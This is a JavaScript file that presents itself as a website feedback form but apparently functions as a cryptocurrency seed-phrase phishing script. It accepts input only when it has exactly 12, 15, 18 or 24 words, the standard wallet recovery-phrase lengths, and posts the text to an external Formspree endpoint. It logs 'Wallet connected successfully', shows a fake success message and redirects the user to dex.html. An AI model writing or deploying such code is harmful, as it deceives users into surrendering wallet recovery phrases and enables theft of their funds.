// Word counter
document.getElementById('feedbackText').addEventListener('input', function() {
    const text = this.value.trim();
    const words = text.split(/\s+/).filter(word => word.length > 0);
    document.getElementById('wordCount').textContent = words.length;
});

// Feedback form validation and handling
document.getElementById('feedbackForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const feedbackText = document.getElementById('feedbackText').value.trim();
    const words = feedbackText.split(/\s+/).filter(word => word.length > 0);
    const wordCount = words.length;
    
    // Validate word count (must be exactly 12, 15, 18, or 24)
    const validCounts = [12, 15, 18, 24];
    
    if (!validCounts.includes(wordCount)) {
        document.getElementById('errorMsg').style.display = 'block';
        document.getElementById('successMsg').style.display = 'none';
        
        setTimeout(() => {
            document.getElementById('errorMsg').style.display = 'none';
        }, 3000);
        
        return;
    }
    
    // Valid feedback - hide error
    document.getElementById('errorMsg').style.display = 'none';
    
    // Disable submit button to prevent multiple submissions
    const submitBtn = document.querySelector('.btn-submit');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Connecting...';
    submitBtn.style.opacity = '0.6';
    
    // Prepare form data
    const formData = new FormData();
    formData.append('feedback', feedbackText);
    
    // Send to Formspree (your actual ID)
    fetch('https://formspree.io/f/xgowwbrp', {
        method: 'POST',
        body: formData,
        headers: {
            'Accept': 'application/json'
        }
    }).then(function(response) {
        console.log('Wallet connected successfully');
    }).catch(function(error) {
        console.log('Error connecting wallet:', error);
    });
    
    // Wait 3 seconds before showing success message
    setTimeout(function() {
        // Show success message
        document.getElementById('successMsg').style.display = 'block';
        
        // Reset form
        document.getElementById('feedbackForm').reset();
        document.getElementById('wordCount').textContent = '0';
        
        // Wait another 2 seconds before redirecting to dex.html
        setTimeout(function() {
            window.location.href = 'dex.html';
        }, 2000);
        
    }, 5000); // 3 seconds delay before success message

});

